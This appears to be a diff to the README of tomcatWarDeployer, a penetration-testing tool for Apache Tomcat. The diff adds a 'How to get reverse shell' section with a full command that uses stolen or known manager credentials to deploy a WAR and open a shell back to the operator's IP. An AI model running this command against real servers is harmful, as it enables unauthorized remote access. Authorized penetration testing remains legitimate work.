@@ -1,3 +1,9 @@
+# How to get reverse shell
+- You need the Tomcat manager's credentials
+```python
+  python3 tomcatWarDeployer.py -v -x -U <username> -P <password> -p <port> -H <YOUR IP> <Tomcat SERVER IP>:8080
+```
+
 ## tomcatWarDeployer
 Apache Tomcat auto WAR deployment &amp; pwning penetration testing tool.
 
